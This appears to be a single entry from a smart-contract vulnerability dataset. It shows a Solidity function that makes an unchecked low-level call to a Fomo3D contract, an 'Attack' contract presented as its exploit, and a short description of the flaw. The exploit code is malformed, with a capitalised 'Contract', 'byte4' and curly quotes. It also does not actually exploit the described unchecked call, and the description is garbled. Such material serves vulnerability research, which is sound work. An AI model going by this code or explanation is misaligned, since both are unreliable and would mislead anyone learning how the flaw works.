## Vulnerable Code

```javascript

function gotake() public  {
    // Link up the fomo3d contract and ensure this whole thing is worth it
    
    if (fomo3d.getTimeLeft() > 50) {
      revert();
    }

    address(fomo3d).call.value( fomo3d.getBuyPrice() *2 )();
    
    fomo3d.withdraw();
}
//out14976.sol
```



## Exploit Code

```javascript
Contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“gotake()”)));
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position.Due to 'Unchecked Low level Call' so if an malicious contract -"Attack" to call mehtod-'gotake', as we looked that.the location of comment of vulnerability position is possible failed.but have not chacked the return value.so progrem will continue.it is danger.
